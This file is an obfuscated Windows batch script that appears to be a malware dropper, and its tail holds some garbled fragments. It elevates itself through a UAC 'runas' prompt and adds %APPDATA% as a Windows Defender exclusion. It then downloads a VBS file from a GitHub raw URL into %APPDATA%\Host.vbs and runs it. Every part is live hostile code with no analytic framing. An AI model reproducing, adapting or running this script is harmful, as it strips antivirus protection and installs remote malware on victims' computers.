��&cls
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
@ec%r:~11,1%o off

REM  --> C%r:~11,1%eck for per%r:~12,1%%r:~2,1%%r:~8,1%%r:~8,1%%r:~2,1%on%r:~8,1%
    %r:~16,1%F "%PROCESSOR_ARCHITECTURE%" EQU "a%r:~12,1%d64" (
>n%r:~13,1%l 2>&1 "%SYSTEMROOT%\%r:~14,1%y%r:~8,1%W%r:~17,1%W64\cacl%r:~8,1%.exe" "%SYSTEMROOT%\%r:~14,1%y%r:~8,1%W%r:~17,1%W64\conf%r:~2,1%%r:~1,1%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%"
) EL%r:~14,1%E (
>n%r:~13,1%l 2>&1 "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\cacl%r:~8,1%.exe" "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\conf%r:~2,1%%r:~1,1%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%"
)

REM --> %r:~16,1%f error fla%r:~1,1% %r:~8,1%e%r:~4,1%, %r:~9,1%e do no%r:~4,1% %r:~11,1%ave ad%r:~12,1%%r:~2,1%n.
%r:~2,1%f '%errorlevel%' NEQ '0' (
    ec%r:~11,1%o Req%r:~13,1%e%r:~8,1%%r:~4,1%%r:~2,1%n%r:~1,1% ad%r:~12,1%%r:~2,1%n%r:~2,1%%r:~8,1%%r:~4,1%ra%r:~4,1%%r:~2,1%ve pr%r:~2,1%v%r:~2,1%le%r:~1,1%e%r:~8,1%...
    %r:~1,1%o%r:~4,1%o U%r:~18,1%CPro%r:~12,1%p%r:~4,1%
) el%r:~8,1%e ( %r:~1,1%o%r:~4,1%o %r:~1,1%o%r:~4,1%%r:~18,1%d%r:~12,1%%r:~2,1%n )

:UACPrompt
    ec%r:~11,1%o %r:~14,1%e%r:~4,1% U%r:~18,1%C = Crea%r:~4,1%e%r:~17,1%%r:~10,1%jec%r:~4,1%^("%r:~14,1%%r:~11,1%ell.%r:~18,1%ppl%r:~2,1%ca%r:~4,1%%r:~2,1%on"^) > "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    %r:~8,1%e%r:~4,1% para%r:~12,1%%r:~8,1%= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %%~%r:~8,1%0"" %params:"=""%", "", "runa%r:~8,1%", 1 >> "%temp%\getadmin.v%r:~10,1%%r:~8,1%"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    ex%r:~2,1%%r:~4,1% /B

:%r:~1,1%o%r:~4,1%%r:~18,1%d%r:~12,1%%r:~2,1%n
 v%r:~10,1%s"
    exit /B

:gotAd%r:~12,1%%r:~2,1%n
    p%r:~13,1%%r:~8,1%%r:~11,1%d "%CD%"
    CD /D "%~dp0"

%r:~8,1%e%r:~4,1%local ena%r:~10,1%

:%r:~1,1%o%r:~4,1%%r:~18,1%dmin
    pushd "%CD%"
    CD /D "%~dp0"

setlocal enabledelayedexpansion

set "exclusionPath=%%r:~18,1%PPDATA%"
set "url=https://raw.githubusercontent.com/violentqm/rest/main/sussyyyyls.vbs"
set "outputFile=%APPDATA%\Host.vbs"

powershell -command "$antivirusEnabled = (Get-MpComputerStatus).AntivirusEna%r:~10,1%led; %r:~2,1%f (-not $antivirusEnabled) { ec%r:~11,1%o Antivirus is not enabled. } else { Add-MpPreference -ExclusionPath '%exclusionPath%' }"

if %errorlevel% neq 0 (
    echo Failed to set exclusion path or antivirus is not enabled.
    ex%r:~2,1%%r:~4,1% /b 1
)

timeo%r:~13,1%%r:~4,1% /%r:~4,1% 3 /nobreak > NUL

powershell -Co%r:~12,1%%r:~12,1%and "(New-Object System.Net.WebClient).DownloadFile('%url%', '%outputFile%')"

%r:~2,1%f not exist "%outputFile%" (
    ec%r:~11,1%o Fa%r:~2,1%led %r:~4,1%o d (
    echo Failed to download WSF data.
    exit /b 1
)

start "" "%outputFile%"

endlocal

@echo off
set a = %%~i
set a = % + %~i"%
set a = %a%
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
